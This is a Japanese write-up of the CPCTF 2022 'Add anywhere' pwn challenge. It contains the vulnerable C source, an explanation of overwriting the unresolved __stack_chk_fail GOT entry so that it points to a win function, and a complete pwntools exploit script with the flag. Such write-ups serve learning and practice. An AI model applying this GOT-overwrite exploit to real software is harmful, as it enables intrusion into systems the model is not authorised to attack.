# CPCTF 2022 `Add anywhere [pwn]` writeup

## 問題
任意アドレス書き込みは怖いけどこれなら...?

`nc add-anywhere.cpctf.space 30014`

実行ファイルとソースコードが配られる。

```c
#include <stdio.h>
#include <stdlib.h>

void win(){
  system("cat /home/user/flag");
}

int main(){
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  void *addr = NULL;
  short num = 0;
  char comment[20];

  puts("You can add a little value to any addr!");
  printf("addr> ");
  scanf("%p",&addr);
  printf("val> ");
  scanf("%hd",&num);

  * (short *)addr += num;

  puts("Any comment?");
  scanf("%28s",comment);

  return 0;
}
```

## 解法
ソースコードを見ると、任意のアドレスに2バイトの値 (short型で宣言されたnum)を加算できるらしい。
これを利用してGOTを書き換えられれば嬉しいところ。

セキュリティ周りを確認する。
```
[*] '/home/caffeine/ctf/cpctf22/pwn/add_anywhere/add-anywhere'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Partial RELROなので目論見通りGOT overwriteが狙えそう。
加えてNo PIEなので実行領域の関数は必ず同じアドレスに読みだされる。
何かしらの関数のリンクをwin関数のアドレスに書き換えられればクリア。

しかしながら、今回の問題はGOTの完全な書き換えは叶いません。
2バイトまでの値が加算できるまで。
Partial RELROの場合、一度も呼び出されていない関数のGOTは.pltセクション内の動的リンクを担う関数のアドレスで初期化されている。
関数が初めて呼び出された際に動的リンクが起動して初めてlibc上のアドレスがGOTに書き込まれる。
libc上のアドレスを2バイト弄ったくらいでは実行領域にあるwin関数のアドレスにはたどりつけない。
まだ一度も実行されておらず、libc上のアドレスでGOTが書き換えられていない関数を見つけて値を書き換える必要がありそう。

ソースコードを見たところ、一見該当しそうな関数はないように思える。
しかしながら今回はBoFを防ぐためのcanaryがある。
__stack_chk_fail関数がシンボル解決前なのでこれをターゲットにする。

## Exploit
win関数のアドレスやGOT上の__stack_chk_fail関数のアドレスなど必要なアドレスをリークする (objdumpやgdbを用いればいいでしょう)。

あとは
+ __stack_chk_fail関数のGOT上のアドレス
+ あらかじめ計算しておいたwin関数のアドレスとGOTの__stack_chk_fail関数のエントリの差分
+ バッファオーバーフローが発生するような冗長なバイト列

を順に送り込めば完成。
以上を踏まえてexploit codeを作成する。

```py
import pwn
import sys

addr_win = 0x4011d6
addr_stack_chk_fail_plt = 0x4010a0
addr_stack_chk_fail_got = 0x404020
addr_stack_chk_fail_got_init = 0x401040
addr_puts_glibc = 0x404018

num =  addr_win - addr_stack_chk_fail_got_init

io = pwn.remote("add-anywhere.cpctf.space",30014)

ret = io.recvuntil("addr> ")
print(ret)

s = hex(addr_stack_chk_fail_got).encode()
io.sendline(s)
print(s)

ret = io.recvuntil("val> ")
print(ret)

s = str(num).encode()
io.sendline(s)
print(s)

ret = io.recvline()
print(ret)

s = b"A" * 40
io.sendline(s)

ret = io.recvline()
print(ret)
```

FLAG: `CPCTF{stack_smashing_to_win}`